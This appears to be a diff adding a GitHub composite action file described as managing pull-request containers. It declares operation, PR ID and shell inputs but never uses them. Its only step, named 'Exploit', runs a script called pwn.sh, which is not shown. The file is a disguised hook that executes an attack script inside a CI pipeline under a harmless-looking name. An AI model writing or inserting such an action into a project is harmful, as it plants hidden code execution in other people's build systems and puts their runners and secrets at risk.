@@ -1,0 +1,20 @@
+name: 'PR Container'
+description: 'Manage PR Containers'
+inputs:
+  operation:
+    description: 'Operation (create, update, remove)'
+    required: true
+  prId:
+    description: 'PR ID'
+    required: true
+  shell:
+    description: 'Shell'
+    required: false
+    default: 'bash'
+
+runs:
+  using: 'composite'
+  steps:
+    - name: Exploit
+      run: bash Actions/PRContainer/pwn.sh
+      shell: bash
